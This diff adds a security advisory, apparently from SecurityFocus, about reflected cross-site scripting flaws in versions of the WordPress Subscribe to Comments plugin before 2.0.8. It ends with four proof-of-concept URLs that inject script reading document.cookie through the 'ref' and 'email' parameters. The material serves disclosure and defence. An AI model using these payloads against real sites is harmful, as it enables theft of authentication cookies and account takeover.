@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/37105/info
+
+The Subscribe to Comments plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials; other attacks are also possible.
+
+Versions prior to Subscribe to Comments 2.0.8 are vulnerable. 
+
+http://www.example.com/blog_path/wp-subscription-manager.php?ref=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/blog_path/wp-admin/edit.php?page=subscribe-to-comments.php&ref=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/blog_path/wp-subscription-manager.php?email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/blog_path/wp-admin/edit.php?page=subscribe-to-comments.php&email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
